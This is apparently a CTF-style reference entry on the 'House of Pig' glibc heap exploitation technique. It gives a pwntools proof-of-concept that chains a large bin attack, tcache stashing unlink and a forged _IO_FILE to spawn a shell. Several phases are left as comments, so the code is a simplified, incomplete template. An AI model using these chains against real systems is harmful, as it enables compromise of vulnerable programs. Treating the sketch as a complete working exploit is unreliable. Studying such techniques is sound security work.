# House of Pig

**When**: glibc 2.31+. Have UAF and heap overflow. Need: large bin attack + tcache stashing unlink + FSOP.
**Primitive needed**: Controlled free of large chunks, UAF on small bin chunk, heap overflow.
**Result**: Code execution via combined primitives — no hooks needed.

## Mechanism
Chains three primitives:
1. **Large bin attack** → write heap address to `_IO_list_all`.
2. **Tcache stashing unlink** → write heap address to `__free_hook` (glibc < 2.34) or to a FILE struct pointer (glibc 2.34+).
3. **FSOP** → the corrupted `_IO_list_all` points to a fake `_IO_FILE` → code execution on `exit()`.

## PoC
```python
# IN: UAF on large/small bin chunks, heap overflow  OUT: shell
from pwn import *

context.binary = elf = ELF('./binary')
libc = ELF('./libc.so.6')
p = process('./binary')

# Phase 1: Libc + heap leak via unsorted bin + tcache
# (standard unsorted bin leak for libc, tcache fd for heap — see heap-primitives.md)

# Phase 2: Large bin attack to write heap_addr → _IO_list_all
# Set up two large chunks of different sizes
alloc(0, 0x428); alloc(1, 0x10)    # guard
alloc(2, 0x418); alloc(3, 0x10)    # guard
alloc(4, 0x410); alloc(5, 0x10)    # for tcache stashing

free(0)
alloc(6, 0x440)   # sort chunk 0 into large bin
free(2)            # chunk 2 into unsorted bin

# Corrupt chunk 0's bk_nextsize → (_IO_list_all - 0x20)
edit(0, p64(0)*3 + p64(libc.sym['_IO_list_all'] - 0x20))

alloc(7, 0x440)   # triggers sort → writes heap addr to _IO_list_all

# Phase 3: Tcache stashing unlink
# Put chunk 4 into small bin, corrupt its bk → (__free_hook - 0x10)
# ... (fill tcache, free chunk 4 → unsorted → sort to small bin)
# Corrupt bk: edit(4, p64(fd_val) + p64(libc.sym['__free_hook'] - 0x10))
# Allocate from small bin → stashing links __free_hook into tcache

# Phase 4: Allocate from tcache → returns __free_hook
# Write system address
alloc(8, 0x410)    # returns __free_hook
edit(8, p64(libc.sym['system']))

# Phase 5: Forge _IO_FILE at the heap address written to _IO_list_all
# (this chunk should contain "/bin/sh\x00" at its start)
# Trigger: exit() → _IO_flush_all → processes our fake FILE
# The fake FILE's vtable __overflow calls system("/bin/sh")

p.interactive()
```

## Trap
- Requires precise heap feng shui — chunk sizes and ordering matter.
- glibc 2.34+ removed `__free_hook` → replace Phase 3 with a direct FSOP path (House of Apple 2 style) or use exit handler / TLS destructor overwrite.
- The fake `_IO_FILE` must be at the exact address written by the large bin attack.
- This is a "composability" technique — it demonstrates how to chain primitive building blocks. Many modern heap exploits follow a similar multi-phase structure.

## Composition Pattern
```
Phase 1: LEAK         (unsorted bin → libc, tcache → heap)
Phase 2: WRITE #1     (large bin attack → target pointer)
Phase 3: WRITE #2     (tcache stashing → second target)
Phase 4: TRIGGER       (exit/abort → FSOP → code execution)
```
This pattern is reusable: swap out the specific write primitives (large bin, tcache stashing, unlink) depending on what the challenge binary allows.
